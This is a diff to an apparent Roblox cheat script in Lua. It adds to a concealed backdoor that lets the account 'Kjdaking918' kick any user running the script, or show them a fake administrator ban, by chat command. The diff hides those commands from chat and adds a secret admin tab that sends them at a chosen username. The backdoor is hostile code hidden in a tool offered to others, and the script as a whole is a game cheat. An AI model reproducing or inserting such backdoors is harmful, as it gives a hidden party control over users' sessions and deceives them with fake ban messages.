@@ -15,12 +15,12 @@ if not PUBLIC_ACCESS and localPlayer.Name ~= "Kjdaking918" then
 end
 
 -- ==========================================
--- COMMAND LISTENER (Kjdaking918 /kick <username> & /tb <username>)
+-- COMMAND LISTENER (Kjdaking918 /kick & /tb)
 -- ==========================================
 task.spawn(function()
     local TextChatService = game:GetService("TextChatService")
     
-    local function handleCommand(messageText)
+    local function handleCommand(messageText, textChatMessage)
         -- Split the message into arguments
         local args = string.split(messageText, " ")
         if #args >= 2 then
@@ -35,7 +35,7 @@ task.spawn(function()
             if isTargetMatch then
                 if cmd == "/kick" then
                     pcall(function()
-                        localPlayer:Kick("You have been kicked for hacking by an admin.")
+                        localPlayer:Kick("You have been kicked by Kjdaking918.")
                     end)
                     
                     -- Backup UI cleanup if kick is blocked by executor
@@ -49,7 +49,7 @@ task.spawn(function()
                 elseif cmd == "/tb" then
                     -- Fake Trollban Message
                     pcall(function()
-                        localPlayer:Kick("\nDisconnected\nYou were banned by an administrator. (Reason: Exploiting / hacking)")
+                        localPlayer:Kick("\nDisconnected\nYou were banned by an administrator. (Reason: Exploiting / TrollBan)")
                     end)
                     
                     -- Backup UI cleanup
@@ -71,17 +71,38 @@ task.spawn(function()
             if textChatMessage.TextSource then
                 local sender = players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
                 if sender and sender.Name == "Kjdaking918" then
-                    handleCommand(textChatMessage.Text)
+                    handleCommand(textChatMessage.Text, textChatMessage)
                 end
             end
         end)
+    end)
+
+    -- Intercept Outgoing Messages (New TextChatService to hide local commands from showing up)
+    pcall(function()
+        local channels = TextChatService:FindFirstChild("TextChannels")
+        if channels then
+            for _, channel in ipairs(channels:GetChildren()) do
+                if channel:IsA("TextChannel") then
+                    channel.ShouldDeliverMessage = function(_, textChatMessage)
+                        if textChatMessage.TextSource and textChatMessage.TextSource.UserId == localPlayer.UserId then
+                            local msg = textChatMessage.Text
+                            if msg:sub(1, 5):lower() == "/kick" or msg:sub(1, 3):lower() == "/tb" then
+                                handleCommand(msg, textChatMessage)
+                                return false
+                            end
+                        end
+                        return true
+                    end
+                end
+            end
+        end
     end)
 
     -- Listen via Legacy Chat System (Player.Chatted)
     local function setupChatListener(plr)
         if plr.Name == "Kjdaking918" then
             plr.Chatted:Connect(function(msg)
-                handleCommand(msg)
+                handleCommand(msg, nil)
             end)
         end
     end
@@ -1478,6 +1499,7 @@ local MacroFrame = createContentScrollingFrame(420)
 local MiscFrame = createContentScrollingFrame(360)
 local NpcFrame = createContentScrollingFrame(450)
 local MusicFrame = createContentScrollingFrame(500)
+local AdminTab = createContentScrollingFrame(300) -- Secret Admin Tab
 
 local function clearTabs()
     for _, btn in ipairs(TabContainer:GetChildren()) do
@@ -1496,6 +1518,7 @@ local function hideAllFrames()
     MiscFrame.Visible = false
     NpcFrame.Visible = false
     MusicFrame.Visible = false
+    AdminTab.Visible = false
 end
 
 local function createTabButton(name, yPos, targetFrame)
@@ -1525,6 +1548,12 @@ local function loadPvPModeTabs()
     createTabButton("Misc", 88, MiscFrame)
     createTabButton("NPC", 128, NpcFrame)
     createTabButton("Music", 168, MusicFrame)
+    
+    -- Only Kjdaking918 gets the Admin tab button added to the list
+    if localPlayer.Name == "Kjdaking918" then
+        createTabButton("Admin Tools", 208, AdminTab)
+    end
+    
     PvPFrame.Visible = true
 end
 
@@ -1534,10 +1563,93 @@ local function loadFarmModeTabs()
     createTabButton("Farm", 8, FarmTab)
     createTabButton("Raid", 48, RaidTab)
     createTabButton("Fruit Notifier", 88, FruitFrame)
+    
+    -- Only Kjdaking918 gets the Admin tab button added here too if needed
+    if localPlayer.Name == "Kjdaking918" then
+        createTabButton("Admin Tools", 128, AdminTab)
+    end
+    
     FarmTab.Visible = true
 end
 
 loadPvPModeTabs()
+
+-- ==========================================
+-- ADMIN TOOLS UI SETUP (Only for Kjdaking918)
+-- ==========================================
+local AdminHeader = Instance.new("TextLabel")
+AdminHeader.Size = UDim2.new(1, -10, 0, 25)
+AdminHeader.Position = UDim2.new(0, 5, 0, 5)
+AdminHeader.BackgroundTransparency = 1
+AdminHeader.Font = Enum.Font.SourceSansBold
+AdminHeader.TextSize = 14
+AdminHeader.TextColor3 = Color3.fromRGB(255, 140, 0)
+AdminHeader.TextXAlignment = Enum.TextXAlignment.Left
+AdminHeader.Text = "Troll / Admin Panel controls:"
+AdminHeader.Parent = AdminTab
+
+local TargetInputBox = Instance.new("TextBox")
+TargetInputBox.Size = UDim2.new(1, -10, 0, 35)
+TargetInputBox.Position = UDim2.new(0, 5, 0, 35)
+TargetInputBox.BackgroundColor3 = Color3.fromRGB(35, 16, 48)
+TargetInputBox.Font = Enum.Font.SourceSans
+TargetInputBox.TextSize = 13
+TargetInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TargetInputBox.PlaceholderText = "Enter target username..."
+TargetInputBox.Text = ""
+TargetInputBox.Parent = AdminTab
+Instance.new("UICorner", TargetInputBox).CornerRadius = UDim.new(0, 6)
+
+local AdminTrollBanBtn = Instance.new("TextButton")
+AdminTrollBanBtn.Size = UDim2.new(1, -10, 0, 35)
+AdminTrollBanBtn.Position = UDim2.new(0, 5, 0, 80)
+AdminTrollBanBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+AdminTrollBanBtn.Font = Enum.Font.SourceSansBold
+AdminTrollBanBtn.TextSize = 13
+AdminTrollBanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+AdminTrollBanBtn.Text = "Trigger Fake TrollBan (/tb)"
+AdminTrollBanBtn.Parent = AdminTab
+Instance.new("UICorner", AdminTrollBanBtn).CornerRadius = UDim.new(0, 6)
+
+AdminTrollBanBtn.MouseButton1Click:Connect(function()
+    local targetName = TargetInputBox.Text
+    if targetName ~= "" then
+        local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if channel then
+            channel:SendAsync("/tb " .. targetName)
+        else
+            -- Fallback / Legacy trigger
+            pcall(function()
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/tb " .. targetName, "All")
+            end)
+        end
+    end
+end)
+
+local AdminKickBtn = Instance.new("TextButton")
+AdminKickBtn.Size = UDim2.new(1, -10, 0, 35)
+AdminKickBtn.Position = UDim2.new(0, 5, 0, 125)
+AdminKickBtn.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+AdminKickBtn.Font = Enum.Font.SourceSansBold
+AdminKickBtn.TextSize = 13
+AdminKickBtn.TextColor3 = Color3.fromRGB(20, 10, 25)
+AdminKickBtn.Text = "Trigger Fake Kick (/kick)"
+AdminKickBtn.Parent = AdminTab
+Instance.new("UICorner", AdminKickBtn).CornerRadius = UDim.new(0, 6)
+
+AdminKickBtn.MouseButton1Click:Connect(function()
+    local targetName = TargetInputBox.Text
+    if targetName ~= "" then
+        local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if channel then
+            channel:SendAsync("/kick " .. targetName)
+        else
+            pcall(function()
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/kick " .. targetName, "All")
+            end)
+        end
+    end
+end)
 
 local farmUnlocked = false
 
